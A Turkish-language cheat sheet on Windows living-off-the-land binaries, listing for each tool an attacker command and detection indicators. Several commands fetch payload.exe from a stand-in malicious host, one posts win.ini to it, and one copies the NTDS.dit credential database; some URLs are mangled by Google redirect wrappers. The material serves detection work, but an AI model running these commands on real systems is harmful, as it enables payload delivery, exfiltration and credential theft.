### certutil.exe

Sertifika yönetimi. Dosya indirme, base64 encode/decode. Volt Typhoon ve Double Dragon tarafından aktif olarak kullanıldığı belgelenmiş.

**Komut:**
- certutil -urlcache -split -f [http://zararli.com/payload.exe](https://www.google.com/search?q=http://zararli.com/payload.exe) out.exe

- certutil -decode encoded.b64 decoded.exe

**IOC:** -urlcache -split -f parametreleri birlikte, 4688'de görünür

-----

### bitsadmin.exe

BITS job yönetimi. Dosya indirme ve persistence (reboot'ta devam eder)

**Komut:**
- bitsadmin /transfer job [http://zararli.com/payload.exe](https://www.google.com/search?q=http://zararli.com/payload.exe) C:\\temp\\p.exe

**IOC:** URL + lokal path argümanı, BITS-Client log

-----

### MpCmdRun.exe

Windows Defender komut satırı arayüzü. Dosya indirme — AV binary'sinin download yapması dikkat çekmez.

**Komut:**
- MpCmdRun.exe -DownloadFile -url [http://zararli.com/payload.exe](https://www.google.com/search?q=http://zararli.com/payload.exe) -path C:\\temp\\p.exe

**IOC:** -DownloadFile parametresi, Defender binary'sinden download beklenmiyor

-----

### desktopimgdownldr.exe

Masa üstü arka plan indirme servisi. Dosya indirme.

**Komut:**
- set SYSTEMROOT=C:\\temp && desktopimgdownldr.exe /lockscreenurl:[http://zararli.com/p.exe](https://www.google.com/search?q=http://zararli.com/p.exe) /eventName:desktopimgdownldr

**IOC:** /lockscreenurl:http:// + kullanıcı dizinine indirme

-----

### finger.exe

Finger protokolü kullanıcı sorgulama. Port 79 üzerinden veri çekme

**Komut:**
- finger user@https://www.google.com/url?sa=E\&source=gmail\&q=zararli.com

**IOC:** Dış IP'ye port 79 bağlantısı, neredeyse hiç meşru kullanımı yok

-----

### findstr.exe

Dosyalarda string arama. UNC path üzerinden dosya kopyalama

**Komut:**
- findstr /V /L W3AllLoveTheSecurity \\https://www.google.com/url?sa=E\&source=gmail\&q=zararli.com\\payload.exe \> C:\\temp\\p.exe

**IOC:** UNC path argümanı + \> yönlendirmesi

-----

### esentutl.exe

ESE veritabanı yönetimi. Dosya kopyalama, NTDS.dit çekme

**Komut:**
- esentutl.exe /y \\https://www.google.com/url?sa=E\&source=gmail\&q=zararli.com\\share\\payload.exe /d C:\\temp\\p.exe /o

- esentutl.exe /y C:\\windows\\ntds\\ntds.dit /d C:\\temp\\ntds.dit /o

**IOC:** /y parametresi = kopyalama, kaynak NTDS.dit ise kritik

-----

### CertReq.exe ⚠️ Yükselen

Sertifika talebi yönetimi. Hem download hem upload için kullanılabilir — certutil'e az bilinen alternatif.

**Komut:**
- CertReq.exe -Post -config [http://zararli.com/](https://www.google.com/search?q=http://zararli.com/) C:\\windows\\win.ini output.txt

**IOC:** -Post parametresi + dış URL, certutil engellendiğinde tercih edilir